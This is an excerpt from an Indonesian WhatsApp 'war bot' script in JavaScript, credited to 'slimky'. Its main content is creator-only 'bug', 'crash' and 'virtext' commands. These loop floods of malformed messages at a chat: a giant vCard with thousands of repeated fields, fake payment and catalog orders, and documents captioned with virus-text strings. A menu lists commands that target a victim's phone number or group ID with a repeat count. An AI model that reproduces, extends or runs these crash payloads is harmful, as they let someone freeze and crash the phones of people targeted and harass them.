...
// Base © °slimky°Hw Mods : Copyan Dari Base Dika

› Create By © °slimky°͢
› Base Ori © °slimky°͢
› Copyan Base Dika Hisoka Morou

🌷 KALAU MAU RENAME TARO CREDITS GUA : © °slimky°*/
...
//=================================================//
const reply = (teks) => {
return haikal.sendMessage(m.chat, { text: teks, contextInfo:{"externalAdReply": {"title": `SC © °slimky°͢`,"body": `Selamat ${salam} kak ${pushname}`, "previewType": "PHOTO","thumbnailUrl": ``,"thumbnail": kalimage,"sourceUrl": `https://youtube.com/@slimkymods1211`}}}, { quoted: m })} 
//=================================================//
try {
...
"message": `${teks}`,
"orderTitle": `${teks}`,
"sellerJid": "6285772363954@s.whatsapp.net",
...
let teks = `${q}`
{
haikal.relayMessage(m.chat, { requestPaymentMessage: { Message: { extendedTextMessage: { text: `${buttonkal}`, currencyCodeIso4217: 'IDR', requestFrom: '0@s.whatsapp.net', expiryTimestamp: 8000, amount: 1, contextInfo:{"externalAdReply": {"title": `SC © °slimky°͢`,"body": `Selamat ${salam} kak ${pushname}`,
mimetype: 'audio/mpeg', caption: `🔥 ${teks} ${buttonkal}`,
showAdAttribution: true,
sourceUrl: `https://youtube.com/@slimkymods1211`,
thumbnailUrl: 'https://telegra.ph/file/10c3793a558ced7ba5ff0.jpg', 
}
}}}}}, { quoted:doc})
}
}
...
break
case 'slimkypoll': case 'slimkyjhon2': {
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} crahsjx\nContoh ${prefix+command} 5`)
crahsjx = `${encodeURI(q)}`
...
{
"optionName": "SALAM BROTHER BY © °slimky°͢"
}
],
...
break
//=================================================//
case 'slimkytroli2': case 'slimkytrol': case 'jutrol': {
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (args.length == 0) return reply(`crahsjxnya?`)
crahsjx = `${encodeURI(q)}`
for (let i = 0; i < crahsjx; i++) {
a = await haikal.sendMessage(m.chat, {react: {  key: { remoteJid: m.chat, fromMe: true, id : m.key.id}}})
let dok = {key : {participant : '0@s.whatsapp.net'},message: {documentMessage: {title: `© ${ownername}`,jpegThumbnail: thumb}}}
...
haikal.sendMessage(m.chat, {document: yy, mimetype: 'application/octet-stream', fileName:`© °slimky°APIs ~ 404 ${buttonkal}.HW` }, {quoted:doc})
}
}
break
//=================================================//
case 'slimkydaca': case 'slimkydaca':  {
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} crahsjx\nContoh ${prefix+command} 5`)
crahsjx = `${encodeURI(q)}`
...
for (let i = 0; i < crahsjx; i++) {
 ...
 haikal.sendMessage(m.chat, {document: ilih, mimetype: '', fileName:`© °slimky°APIs ~ 404 ${buttonkal}.HW` }, {quoted:doc})
 }
 }
 break
//=================================================//
case 'slimkydocu': case 'slimkydraknes':  {
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} crahsjx\nContoh ${prefix+command} 5`)
crahsjx = `${encodeURI(q)}`
...
break
//=================================================//
case 'duc': case 'slimkyslebew': case 'cumadocu': {
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} crahsjx\nContoh ${prefix+command} 5`)
crahsjx = `${encodeURI(q)}`
...
break
//=================================================//
case 'slimkyvirtext1': case 'slimkyzsu': case 'crashar1': {
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (args.length == 0) return m.reply(`crahsjxnya?`)
crahsjx = `${encodeURI(q)}`
for (let i = 0; i < crahsjx; i++) {
haikal.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/c2fda8b471c869a46b8c5.jpg' }, caption: `© °slimky°${iphone}` }, { quoted: doc })
}
}
break
case 'slimkyvirtext2': case 'slimkytol': case 'crashar2': {
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (args.length == 0) return m.reply(`crahsjxnya?`)
crahsjx = `${encodeURI(q)}`
for (let i = 0; i < crahsjx; i++) {
haikal.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/c2fda8b471c869a46b8c5.jpg' }, caption: `© °slimky°${iphone1}` }, { quoted: doc })
}
}
break
case 'slimkyvirtext3': case 'slimkymemek': case 'crashar3': {
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (args.length == 0) return m.reply(`crahsjxnya?`)
crahsjx = `${encodeURI(q)}`
for (let i = 0; i < crahsjx; i++) {
haikal.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/c2fda8b471c869a46b8c5.jpg' }, caption: `© °slimky°${iphone2}` }, { quoted: doc })
}
}
break
case 'slimkyvirtext4': case 'slimkycontol': case 'crashar4': {
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (args.length == 0) return m.reply(`crahsjxnya?`)
crahsjx = `${encodeURI(q)}`
for (let i = 0; i < crahsjx; i++) {
haikal.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/c2fda8b471c869a46b8c5.jpg' }, caption: `© °slimky°${iphone3}` }, { quoted: doc })
}
}
break
case 'slimkyvirtext5': case 'slimkytextv': case 'crashar5': {
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (args.length == 0) return m.reply(`crahsjxnya?`)
crahsjx = `${encodeURI(q)}`
for (let i = 0; i < crahsjx; i++) {
haikal.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/c2fda8b471c869a46b8c5.jpg' }, caption: `© °slimky°${iphone4}` }, { quoted: doc })
}
}
break
case 'slimkyvirtext6': case 'slimkygas': case 'crashar6':{
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (args.length == 0) return m.reply(`crahsjxnya?`)
crahsjx = `${encodeURI(q)}`
for (let i = 0; i < crahsjx; i++) {
haikal.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/c2fda8b471c869a46b8c5.jpg' }, caption: `© °slimky°${iphone5}` }, { quoted: doc })
}
}
break
case 'slimkyvirtext7': case 'slimkyvirtext': {
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (args.length == 0) return m.reply(`crahsjxnya?`)
crahsjx = `${encodeURI(q)}`
for (let i = 0; i < crahsjx; i++) {
haikal.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/c2fda8b471c869a46b8c5.jpg' }, caption: `© °slimky°${iphone6}` }, { quoted: doc })
}
}
break
case 'slimkyvirtext8': case 'slimkyvirtext1': case 'crashar7':{
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (args.length == 0) return m.reply(`crahsjxnya?`)
crahsjx = `${encodeURI(q)}`
for (let i = 0; i < crahsjx; i++) {
haikal.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/c2fda8b471c869a46b8c5.jpg' }, caption: `© °slimky°${buttonkal}` }, { quoted: doc })
}
}
break
case 'slimkyvirtext9': case 'slimkyvirtext2': case 'crashar8':{
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (args.length == 0) return m.reply(`crahsjxnya?`)
crahsjx = `${encodeURI(q)}`
for (let i = 0; i < crahsjx; i++) {
haikal.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/c2fda8b471c869a46b8c5.jpg' }, caption: `© °slimky°${buttonvirus}` }, { quoted: doc })
}
}
break
case 'slimkyvirtext10': case 'slimkyvirtext3': case 'crashar9': {
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (args.length == 0) return m.reply(`crahsjxnya?`)
crahsjx = `${encodeURI(q)}`
for (let i = 0; i < crahsjx; i++) {
haikal.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/c2fda8b471c869a46b8c5.jpg' }, caption: `© °slimky°${ngazap(prefix)}`}, { quoted: doc })
}
}
break
//=================================================//
case 'slimkybug1': case 'slimkycrash': case 'crashar10':{
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} crahsjx\nContoh ${prefix+command} 5`)
crahsjx = `${encodeURI(q)}`
...
break
//=================================================//
case 'slimkybug2': case 'slimkycrash1': case 'crashar11': {
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} crahsjx\nContoh ${prefix+command} 5`)
crahsjx = `${encodeURI(q)}`
...
"mimetype": "image/jpeg",
"caption": `© © °slimky°͢${ngazap(prefix)}`,
...
{ callButton: { displayText: `OWNER`, phoneNumber: `6285772363954`}},
...
{ quickReplyButton: { displayText: `HAIKAL`, id: `JAGOAN OM?`}},
 ...
 break
//=================================================//
case 'slimkybug3': case 'slimkycrash2': case 'crashar12': {
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} crahsjx\nContoh ${prefix+command} 5`)
crahsjx = `${encodeURI(q)}`
...
"fileName": `© © °slimky°͢${ngazap(prefix)}`,
...
break
//=================================================//
case 'slimkybug4': case 'slimkycrash3': case 'crashar13':{
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} crahsjx\nContoh ${prefix+command} 5`)
crahsjx = `${encodeURI(q)}`
...
break
//=================================================//
case 'slimkybug5': case 'slimkycrash4': case 'crashar14': {
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} crahsjx\nContoh ${prefix+command} 5`)
crahsjx = `${encodeURI(q)}`
...
break
case 'slimkybug6': case 'slimkycrash5': case 'crashar15':{
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} crahsjx\nContoh ${prefix+command} 5`)
crahsjx = `${encodeURI(q)}`
...
"description": "Developer © °slimky°͢\nWhatsApp / Script Bot \n\nORDER ? CHAT AJA 👋",
"title": `© © °slimky°͢${ngazap(prefix)}`,
"previewType": "NONE",
"jpegThumbnail": messa.imageMessage,
}
...
break
//=================================================//
case 'slimkybug8': case 'slimkycrash7': case 'crashar17': {
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} crahsjx\nContoh ${prefix+command} 5`)
crahsjx = `${encodeURI(q)}`
...
break
//=================================================//
case 'buglokas': case 'slimkylokas2': {
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} crahsjx\nContoh ${prefix+command} 5`)
crahsjx = `${encodeURI(q)}`
...
"groupJid": "85296556573-1328272333@g.us",
"inviteCode": "wFHwtOxGQN8OwK2x",
"inviteExpiration": `MY NAME © °slimky°͢${ngazap(prefix)}`,
"groupName": `MY NAME © °slimky°͢${ngazap(prefix)}`,
...
"status": "INQUIRY",
"surface": "CATALOG",
"message": `© © °slimky°͢${ngazap(prefix)}`,
"jpegThumbnail":fs.readFileSync('./baseikal/image/pict.jpg'),
"orderTitle": `© © °slimky°͢${ngazap(prefix)}`,
...
"retailerId": `© © °slimky°WE ARE NOT MASTOD`,
...
case 'slimky59':
case 'slimky60':
case '🥷🏼': case '☠️': case '️🏴‍☠️': case '🤡': case '🌚': case '🌝': case '🤑': case '💤': case '🛐': case '🥵': case '🥶': case '⚡': case '💥': case '🔥': case '🙈': case '😱': case '😰': case '😨': case '🖤': case '💌': case '🤢': case '🤮': case '🙏': case '💅': case '😪': 
case '✨':
case '💫':
case '🦄':
case '🐷': 
...
break
//=================================================//
case 'slimkystik': case 'slimkykangbug': case 'buttonkematian': case 'crashar19': {
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} crahsjx\nContoh ${prefix+command} 5`)
crahsjx = `${encodeURI(q)}`
...
deploy(`Sukses Send Bug Sebanyak ${crahsjx}`)
}
break
//=================================================//
...
break
//=================================================//
case 'slimkybugie': case 'slimkykangbug1': case 'crashar20': {
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} crahsjx\nContoh ${prefix+command} 5`)
crahsjx = `${encodeURI(q)}`
...
urlButton: {
displayText: `GITHUB`,
url: 'https://youtube.com/@slimkymods1211'
}
},
{
quickReplyButton: {
...
break
//=================================================//
case 'slimkybutton': case 'slimkykangbuttton': case 'testbutton': case 'inibutton': 
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} crahsjx\nContoh ${prefix+command} 5`)
crahsjx = `${encodeURI(q)}`
...
haikal.sendMessage(m.chat, { document: anuin, mimetype: 'application/octet-stream', fileName: `© °slimky°${ngazap(prefix)}.BIN`, title: `© °slimky°${ngazap(prefix)}.BIN` }, { quoted: doc })
}
}
break
//=================================================//
case 'slimkytod': case 'slimkyewe': {
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} crahsjx\nContoh ${prefix+command} 5`)
crahsjx = `${encodeURI(q)}`
ydd = `Hallo Aku haikal`
for (let i = 0; i < crahsjx; i++) {
 const fkontaak = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "@broadcast" } : {})}, message: { "contactMessage":{"displayName": `© © °slimky°͢${ngazap(prefix)}`,"vcard":`BEGIN:VCARD\nVERSION:3.0\nN:2;conn;;;\nFN:© °slimky°͢\nitem1.TEL:+6285788734756\nitem1.X-ABLabel:Celular\nitem2.EMAIL;type=INTERNET:EMAIL;CHARSET=UTF-8;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;\nEND:VCARD` }}}
...
break
//=================================================//
case 'slimkybokep': case 'slimkyngentod': {
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} crahsjx\nContoh ${prefix+command} 5`)
crahsjx = `${encodeURI(q)}`
...
haikal.sendMessage(m.chat, anuala, `© °slimky°͢${ngazap(prefix)}`, m)
}
}
break
case 'bugcrot' :
...
if (isBan) throw sticBanLu(from)
if (!text) throw `Example : ${prefix + command} © °slimky°͢, 7, 7, 2005, Putri, 16, 11, 2004`
...
case 'artinama': {
if (isBan) throw sticBanLu(from)
if (!text) throw `Example : ${prefix + command} © °slimky°Gans`
...
if (isBan) throw sticBanLu(from)
if (!text) throw `Example : ${prefix + command} © °slimky°͢, 7, 7, 2005`
...
if (isBan) throw sticBanLu(from)
if (!text) throw `Example : ${prefix + command} © °slimky°͢|Putri`
...
case 'fengshui': {
if (isBan) throw sticBanLu(from)
if (!text) throw `Example : ${prefix + command} © °slimky°͢, 1, 2005\n\nNote : ${prefix + command} Nama, gender, tahun lahir\nGender : 1 untuk laki-laki & 2 untuk perempuan`
...
if (isBan) throw sticBanLu(from)
let buttons = [
{buttonId: `bugslimky`, buttonText: {displayText: 'BUG SLIMKY'}, type: 1},
{buttonId: `creator`, buttonText: {displayText: 'OWNER'}, type: 1},
{buttonId: `menuslimky`, buttonText: {displayText: 'MENU SLIMKY'}, type: 1}
]
const buttonMessage = {
video:fs.readFileSync("./baseikal/video/haikal.mp4"),
gifPlayback:true,
...
[ 🇲🇨 Aku Adalah Bot War Multifungsi Dari Indonesia]
...
┗━━⊱
 ▰▱▰▱▰▱▰▱▰▱▰▱▰▱
© °slimky°͢`, contextInfo:{"externalAdReply": {"title": `SC °slimky°͢`,"body": `Selamat ${salam} kak ${pushname}`,
previewType: "PHOTO",
showAdAttribution: true,
sourceUrl: `https://youtube.com/@slimkymods1211`,
thumbnailUrl: 'https://telegra.ph/file/10c3793a558ced7ba5ff0.jpg', 
...
[ 🇲🇨 slimky Anti Gedor, bantai bch rasis/songong ]
...
▬▭▬▭▬▭▬▭▬▬▭▬▭▬
┏━━⊱[ SPECIAL ]
┣⃟⚡afk { kasih reactions }
┣⃟⚡slimkyghoib [ on / off ]
┣⃟⚡slimkyjagoan [ reply target ]
┣⃟⚡slimkysange [ Harus Menjadi Admin ]
┣⃟⚡bugtiktok [ Link ] - Bug Sw
┗━━⊱[°slimky°]
▬▭▬▭▬▭▬▭▬▬▭▬▭▬
┏━━⊱[ TARGET ]
┣⃟⚡🔥 628xxx|5|5
┣⃟⚡crashmex 628xxx|5|5
┣⃟⚡slimkyskuy 628xxx
┣⃟⚡slimkysantet 628xxx@s.whatsapp.net|10|10s
┣⃟⚡catalogpc 628xxx@s.whatsapp.net|10|10s
┗━━⊱[°slimky°]
▬▭▬▭▬▭▬▭▬▬▭▬▭▬
Ketik > m.chat ( di group dulu )
┏━━⊱[ GROUP ]
┣⃟⚡gasslimky 112674448xxx
┣⃟⚡slimkysantetgc  1237891xxxx@g.us|10|10s
┣⃟⚡cataloggc 1237891xxxx@g.us|10|10s
┗━━⊱[°slimky°]
┏━━⊱[ BUG ]
┣⃟⚡💀 》۝➣➢
┣⃟⚡🥷🏼 》۝➣➢
...
▬▭▬▭▬▭▬▭▬▬▭▬▭▬
┏━━⊱[ JADI BUG VIP ]
┣⃟⚡jadikatalog [reply sticker] crahsjx
┣⃟⚡jadijago [Masukan text nya]
┣⃟⚡jadipolling [Masukan text nya]
┣⃟⚡jaditroli [Masukan text nya]
┣⃟⚡jadilokas [Masukan text nya]
┣⃟⚡jadidarknes [Masukan text nya]
┣⃟⚡jadidocu [Masukan text nya]
┣⃟⚡jadibugin𝐯ite [Masukan text nya]
┣⃟⚡jadibugpayment [Masukan text nya]
┣⃟⚡jadibugsw [Masukan text nya]
┣⃟⚡jadibugbokep [Masukan text nya]
┣⃟⚡jadibugbutton [Masukan text nya]
┣⃟⚡jadi𝐯irtext1 [Masukan text nya]
┣⃟⚡jadi𝐯irtext2 [Masukan text nya]
┣⃟⚡jadi𝐯irtext3 [Masukan text nya]
┣⃟⚡jadi𝐯irtext4 [Masukan text nya]
┣⃟⚡jadi𝐯irtext5 [Masukan text nya]
┣⃟⚡jadi𝐯irtext6 [Masukan text nya]
┣⃟⚡jadi𝐯irtext7 [Masukan text nya]
┣⃟⚡jadi𝐯irtext8 [Masukan text nya]
┣⃟⚡jadi𝐯irtext9 [Masukan text nya]
┣⃟⚡jadi𝐯irtext10 [Masukan text nya]
┣⃟⚡jadibug1 [Reply Video Jadi Bug Audio]
┣⃟⚡jadibug2 [Reply Video Jadi Bug Mp3]
┣⃟⚡jadibug3 [Reply Audio Jadi Bug Vn]
┣⃟⚡jadibug4 [Reply Sticker Jadi Bug Gambar]
┣⃟⚡jadibug5 [Reply Gambar Jadi Bug Once] 
┗━━⊱[°slimky°]
▬▭▬▭▬▭▬▭▬▬▭▬▭▬
┏━━⊱[ VIRTEXT ]
┣⃟⚡slimky𝐯irtext1 》۝➣➢
...
▬▭▬▭▬▭▬▭▬▬▭▬▭▬
┏━━⊱[ BROADCAST ]
┣⃟⚡bugbcimage [ Bug image Broadcast ]
┣⃟⚡bugbcvideo [ Bug Video Broadcast ]
